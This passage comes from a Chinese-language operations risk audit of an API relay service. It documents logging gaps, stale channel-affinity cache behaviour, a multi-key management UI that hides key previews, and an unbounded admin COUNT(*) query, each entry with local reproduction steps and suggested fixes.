  - `controller/relay.go:366-392`：错误日志只调用 `AppendChannelAffinityAdminInfo`；如果上面没有 `ginKeyChannelAffinityLogInfo`，错误日志的 `admin_info` 只有 use_channel、多 key index 等字段，不会包含 affinity rule/key。
  - `service/log_info_generate.go:272-288`：成功消费日志也同样只追加 `AppendChannelAffinityAdminInfo` 的结果；cache miss 后随机渠道成功时，如果没有 `MarkChannelAffinityUsed`，日志也不会显示“本次已建立 affinity meta 并将写入 cache”。
  - `middleware/distributor.go:107-110` 与 `middleware/utils.go:12-27`：preferred channel 已禁用且 skip retry 时，middleware 直接返回 403 并只写一条普通应用错误日志，不进入 `controller/relay.go` 的结构化错误日志路径。
  - `docs/newapi-ops-risk-audit.md:7271-7296`：风险 241 已覆盖 skip retry 阻断 fallback 的行为；本轮新增聚焦阻断原因在日志/观测层不可见。
  - `docs/newapi-ops-risk-audit.md:7569-7588`：关于错误日志包含 affinity 信息的正向边界只适用于已 `MarkChannelAffinityUsed` 的 preferred hit 路径；cache miss 和 middleware abort 路径不满足该条件。
- 可能后果：Root 看到同一个 `prompt_cache_key` 或首次 Codex 请求失败且 `use_channel` 只有一个渠道，会以为是普通重试策略、错误码不可重试、token 限制或渠道池不足；日志中却没有 `rule_name/key_fp/skip_retry/cache_hit=false` 来说明 affinity 规则在失败前已经介入并阻断 fallback。对于 preferred channel disabled 的 403，结构化错误日志甚至不会记录这次 affinity 命中和 disabled channel id，只有应用日志中的普通文本。结果是运营很难统计“多少失败是 affinity skip retry 导致”、无法区分 cache miss 首次失败和 cache hit 坏渠道，也难以验证清理 affinity cache、关闭规则或调整 `SkipRetryOnFailure` 后是否改善错误率。该问题不会直接改变扣费，但会放大风险 241 的可用性影响和排障成本。
- 复现思路：本地配置两个 Codex 假渠道，A 返回 500、B 返回 200；使用唯一 `prompt_cache_key`，确保 affinity cache miss 且随机选到 A。请求失败后检查 `logs.other.admin_info` 是否只有 `use_channel` 而没有 `channel_affinity`，同时确认 `shouldRetry` 因 affinity meta 停止重试。再让 cache 指向一个 disabled channel，重复请求，观察 middleware 直接返回 affinity disabled，结构化 error log 是否缺失该 affinity key/channel 详情。复现只用本地假上游和测试日志。
- 修复建议：把 affinity 观测信息分为“规则匹配 meta”和“实际命中 preferred channel”两层。`setChannelAffinityContext` 后应立即写入一个脱敏的 `channel_affinity_candidate` 日志上下文，包含 rule name、key fp、key hint、cache_hit=false/true、skip_retry、ttl、using group、model、request path；`MarkChannelAffinityUsed` 再补充 selected channel/group。`ShouldSkipRetryAfterChannelAffinityFailure` 返回 true 时应记录结构化 reason，例如 `retry_skipped_by_affinity=true`、`affinity_cache_hit=false`、`preferred_channel_id`、`preferred_channel_status`。middleware 直接 abort 的 affinity disabled 路径应调用统一的结构化错误日志或至少写安全脱敏的 admin_info，避免只剩文本应用日志。前端用量日志和错误日志应显示“规则匹配但未命中 cache”和“cache 命中渠道不可用”的不同状态。
- 优先级：P3
- 当前状态：已确认 cache miss 路径会保留 affinity meta 并可阻断 retry，但不会设置 `ginKeyChannelAffinityLogInfo`；preferred disabled 直接 abort 也不会进入 relay 结构化错误日志，尚未修复。

### 风险 252：删除或禁用 affinity 规则不会清理旧 cache；同名规则在 TTL 内重新启用会复活旧 channel 粘性，且删除后无法按旧 rule name 精准清理

- 标题：`channel_affinity_setting.enabled=false` 或删除某条 rule 时，运行时不会自动清理该 rule 已写入的 affinity cache 和 usage stats。规则关闭期间旧 cache 不参与选渠；但如果 Root 在 TTL 内重新启用同名/同 key 结构规则，旧 channel id 会再次被读取，恢复到关闭前的粘性状态。更麻烦的是，规则删除后按 rule 清理接口会因为当前配置里找不到 rule name 而返回“未知规则名称”，不能精准删除该旧 rule 的残留 key。
- 影响范围：事故应急关闭 affinity、删除高风险 Codex/Claude/custom rule、修改 key source/TTL/skip retry、重新启用同名规则、Root 清理 cache、Redis/本地 cache 残留、usage stats 弹窗、坏渠道/旧凭证粘性复活。
- 触发条件：某条 affinity 规则已经写入 cache；Root 因事故把全局 `enabled` 关掉、删除 rule、修改 rule key source 或关闭 `skip_retry_on_failure`；没有同时执行清空全部 cache；随后在原 TTL 内重新启用同名 rule，或尝试按已删除的 rule name 清理。
- 涉及文件/函数：
  - `controller/option.go:120-165` 与 `model/option.go:588-620`：通用 option 保存只更新配置字段；对 `channel_affinity_setting.*` 没有后处理 hook，不会自动调用 clear cache 或重建 cache。
  - `setting/operation_setting/channel_affinity_setting.go:116-121`：`channel_affinity_setting` 注册为全局配置对象；配置变更只影响后续 `GetChannelAffinitySetting()` 读取到的规则。
  - `service/channel_affinity.go:550-554`：全局 `Enabled=false` 时 `GetPreferredChannelByAffinity` 直接返回，不读取旧 cache；这是关闭期间不继续影响请求的正向边界。
  - `service/channel_affinity.go:564-621`：重新启用且规则再次匹配时，会按当前 rule 构造 `cacheKeySuffix` 并读取 cache；如果 rule name/key source/model/group 结构相同，旧 value 会被重新采用。
  - `service/channel_affinity.go:681-706`：`RecordChannelAffinity` 在 setting disabled 时不写新 cache，但不会删除旧 cache。
  - `service/channel_affinity.go:198-210`：清空全部 cache 需要 Root 显式调用 `ClearChannelAffinityCacheAll`；配置保存路径不会自动调用。
  - `service/channel_affinity.go:213-245`：按 rule 清理会先在当前 `setting.Rules` 里查找 rule name；删除 rule 后再想按旧名称清理会得到“未知规则名称”，只能清空全部或重新添加同名 rule 再清理。
  - `service/channel_affinity.go:758-845`：usage stats cache 同样不会因规则删除/禁用自动清理，后续 UI 可能继续展示旧 key fp 的历史窗口数据。
  - `docs/newapi-ops-risk-audit.md:7420-7436`：既有生命周期复核已指出渠道删除/禁用/能力变更后旧 affinity key 会占用 cache 并污染 stats；本轮新增聚焦规则配置关闭/删除/重新启用后的粘性复活和无法按旧 rule 精准清理。
  - `docs/newapi-ops-risk-audit.md:7332-7358`：风险 243 覆盖非法配置导致运行态不可信；本轮不同点是合法删除/关闭规则后，旧 cache 状态仍保留。
- 可能后果：Root 因某条 Codex affinity 规则导致局部 500/403，先删除该 rule 以恢复普通路由；请求确实暂时不再走 affinity。但如果稍后重新添加同名规则验证修复效果，旧 cache 中指向坏 channel、旧 OAuth 账号或旧多 key 语义的记录会立刻复活，事故看起来像“修复无效”或“新规则刚上线就坏”。删除 rule 后不能按旧 rule name 清理，会迫使 Root 清空全部 affinity cache，影响其它正常规则；若不清理，stats 页的 total/unknown 和 usage cache 也会继续保留旧 rule 数据，误导运营判断还有请求命中已删除规则。该问题不直接改动余额，但会降低应急回滚、灰度重启和事故排障的可控性。
- 复现思路：本地启用规则 `codex cli trace`，让 `prompt_cache_key=x` 成功写入 channel A；删除该规则或关闭全局 enabled，不清 cache；确认同 key 请求走普通路由。随后在 TTL 内重新添加同名同结构规则，观察是否再次 preferred 到 A。再删除 rule 后调用 `DELETE /api/option/channel_affinity_cache?rule_name=codex%20cli%20trace`，确认接口因当前配置找不到 rule 而不能精准清理。复现只用本地假渠道和测试 Redis/内存 cache。
- 修复建议：配置保存时应计算旧/新 rules diff：删除 rule、禁用全局、修改 key source/include dimensions、修改 skip retry 或 param template 时，提供自动清理受影响 cache 的选项，至少提示 Root “旧 cache 会保留到 TTL”。按 rule 清理接口应允许传旧 rule name 并直接按 namespace prefix 删除，不应要求当前配置仍存在该 rule；如果担心误删，应显示匹配 key 数和确认。cache key 建议加入 rule version/config hash，规则变更后天然不复用旧 cache；usage stats 也应带 rule version，避免旧窗口数据伪装成新规则效果。前端保存规则时应提供“保存并清理受影响 affinity/cache stats”的明确动作。
- 优先级：P3
- 当前状态：已确认配置关闭/删除不会自动清理旧 cache；重新启用同名同结构规则会重新读取旧 key；删除 rule 后按 rule 清理接口无法识别旧名称，尚未修复。

### 风险 260：多 key 管理前端不展示后端返回的 key 预览，启停/删除只按易漂移 index 确认，容易误操作供应商 key

- 标题：后端 `get_key_status` 返回 `key_preview`，但前端多 key 管理弹窗只显示 `#index`、状态、禁用原因和时间；行操作与确认弹窗也只携带 `keyIndex`，文案不包含 key 预览、当前状态、禁用原因或渠道级状态。多 key 删除会重排 index，运营在大量 key、分页、筛选或事故处理时容易禁用/启用/删除错误 key。
- 影响范围：多 key 渠道手工禁用、启用、删除、删除自动禁用 key、自动禁用事故处理、供应商 key 成本隔离、上游封禁/限流排查、客服和运营交接。
- 触发条件：多 key 渠道包含较多 key；管理员在弹窗中按 index 操作；之前执行过删除 key、删除自动禁用 key、替换/追加 key 或复制渠道导致 index 变化；多个 key 的状态/原因相同或为空；分页/筛选后只看到局部列表。
- 涉及文件/函数：
  - `controller/channel.go:1254-1260`：后端 `KeyStatus` 包含 `KeyPreview` 字段，注释为 key 前 10 个字符用于识别。
  - `controller/channel.go:1341-1353`：`get_key_status` 为每个 key 生成 `keyPreview` 并放入响应，说明后端已经尝试提供脱敏识别信息。
  - `web/default/src/features/channels/types.ts:177-183`：前端 `KeyStatus` 类型声明了可选 `key_preview`，但当前展示没有使用。
  - `web/default/src/features/channels/components/dialogs/multi-key-manage-dialog.tsx:365-404`：表格列只有 Index、Status、Disabled Reason、Disabled Time、Actions；没有 key preview、key fingerprint 或供应商账号摘要。
  - `web/default/src/features/channels/components/dialogs/multi-key-table-row-actions.tsx:23-63`：行操作只传 `keyIndex` 和 `status`，按钮文案只是 Enable/Disable/Delete。
  - `web/default/src/features/channels/lib/multi-key-utils.ts:40-60` 与 `web/default/src/features/channels/constants.ts:209-218`：确认文案是通用句子，例如 “Delete this key?”，不包含 index、key preview、状态、原因、渠道名或删除后是否会重排。
  - `web/default/src/features/channels/components/dialogs/multi-key-manage-dialog.tsx:162-207`：操作成功后只 toast 后端 message 并刷新 key 状态/渠道列表；没有展示本次操作对象的不可变识别信息或操作前后 diff。
  - `controller/channel.go:1563-1641`、`controller/channel.go:1643-1709`：删除单个 key 或删除 auto-disabled key 会重建 key 列表并重排剩余 index；这会让前端历史截图里的 `#12` 不再稳定代表同一 key。
  - `docs/newapi-ops-risk-audit.md:6420-6446`：风险 217 已覆盖 index 作为历史归因维度会漂移；本轮新增聚焦前端明明收到 key 预览却没有展示，导致手工操作阶段误识别。
- 可能后果：运营想删除被上游封禁的 key-A，但弹窗里只能看到 `#7 Auto Disabled`，如果 key 列表刚经过删除/重排或多人协作截图滞后，可能删除/启用/禁用成 key-B。误删除正常 key 会减少可用容量，误启用故障 key 会让坏 key 重新接流量，误禁用高余额 key 会把成本压到其它 key。结合 channel/ability 不同步，前端显示“Enable All/Disable All 成功”还不能说明真实路由已恢复或下线；结合风险 217，事后日志里的 index 也无法长期证明当时操作的是哪一个供应商凭证。
- 复现思路：本地创建包含 20 个 key 的多 key 渠道，调用 key 状态接口确认响应里有 `key_preview`；打开前端弹窗，观察表格没有展示 key preview，删除确认也不显示具体 key。删除一个较前面的 key 后重新打开弹窗，观察后续 index 全部前移，旧截图或操作记录里的 index 已无法对应同一个 key。再按筛选只看 auto-disabled，确认列表只给局部 index 和状态，仍缺少可识别 key 预览。
- 修复建议：前端应展示后端返回的脱敏 key preview 或更好的不可逆 fingerprint，并在确认弹窗里包含 `channel_id/channel_name/key_index/key_preview/current_status/disabled_reason`。删除和批量删除前应提示 index 会重排；成功后返回并展示操作前后的 key fingerprint diff。后端最好提供稳定 `key_id/key_fingerprint`，前端操作提交该稳定 id 而不是单纯 index；在此之前，前端至少要在每次操作前重新拉取当前 key 状态并确认 preview 未变化。渠道级 status/abilities 可用性也应显示在弹窗顶部，避免 key 级成功被误读为路由已变化。
- 优先级：P3
- 当前状态：已确认前端收到但不展示 `key_preview`，所有单 key 操作和确认都以 index 为主要识别信息；尚未修复。

### 风险 271：管理员充值记录默认列表每次全表 `COUNT(*)`，大表时会绕过搜索硬上限形成后台 DoS 热点

- 标题：`GetAllTopUps` 无关键词、无时间窗口、无专用限流，先对 `top_ups` 全表计数再分页返回；即使不触发 `SearchAllTopUps`，管理员打开充值历史也可能扫描全表。
- 影响范围：管理员充值记录弹窗、支付事故排查、`top_ups` 大表、数据库 CPU/IO、支付回调同库可用性、后台运营体验。
- 触发条件：`top_ups` 表长期累积大量普通充值和订阅镜像记录；管理员打开充值记录列表或自动刷新第一页；泄露的管理员/root access token 批量请求 `/api/user/topup`；数据库没有把全量 count 做缓存或近似统计。
- 涉及文件/函数：
  - `router/api-router.go:128-133`：`GET /api/user/topup` 只挂在 `AdminAuth()` 组内，没有 `CriticalRateLimit()` 或 `SearchRateLimit()`。
  - `controller/topup.go:480-503`：无 `keyword` 时直接调用 `model.GetAllTopUps(pageInfo)`；有 keyword 才进入搜索路径。
  - `model/topup.go:302-329`：`GetAllTopUps` 不限制时间窗口，先执行 `tx.Model(&TopUp{}).Count(&total)`，再 `Order("id desc").Limit(...).Offset(...).Find(&topups)`。
  - `model/topup.go:348-350` 与 `model/topup.go:392-430`：`searchTopUpCountHardLimit` 只用于 `SearchAllTopUps`，默认列表不受该硬上限影响。
  - `model/topup.go:258-299`：普通用户 `/api/user/topup/self` 按 `user_id` 和最近 30 天窗口查询，是正向对照。
  - `web/default/src/features/wallet/api.ts:249-260` 与 `web/default/src/features/wallet/components/dialogs/billing-history-dialog.tsx:197-217`：管理员账单历史会调用 `/api/user/topup` 并展示全平台 `trade_no/user_id`。
  - `docs/newapi-ops-risk-audit.md:2636-2650`：风险 130 已覆盖 `SearchAllTopUps` 的 `COUNT + LIKE` 硬上限不可靠；本轮新增的是无搜索关键词的默认列表全表计数。
- 可能后果：订单量增长后，管理员只是打开充值历史第一页，也会让数据库做一次全表 `COUNT(*)`；支付事故或客服高峰期反复刷新会和支付回调、补单、充值分析争用同库资源。若系统 access token/管理员 cookie 被脚本化使用，攻击者不需要构造模糊关键词，只请求默认列表即可制造大表 count 压力。该风险不直接导致越权充值，但会削弱支付系统在排障和高峰期的可用性。
- 复现思路：本地或压测库批量插入大量 `top_ups`，打开数据库慢查询日志；以管理员身份请求 `/api/user/topup?p=1&page_size=10` 且不带 keyword，观察是否执行全表 `COUNT(*)`，以及响应时间是否随表规模增长。该复现只使用本地数据，不触碰真实支付网关。
- 修复建议：管理员充值列表默认增加时间窗口，例如最近 30/90 天，并提供明确的历史归档查询；第一页可返回 `has_more` 而不是精确 total，或用缓存/近似计数。需要精确全量统计时走后台异步导出任务，带 reason、审计、速率限制和超时。路由层建议对 `/api/user/topup` 增加后台查询限流，搜索和默认列表都要求最小查询条件或时间范围。
- 优先级：P3
- 当前状态：代码确认默认管理员充值列表存在无窗口全表 count；尚未用大表慢查询日志量化具体阈值。

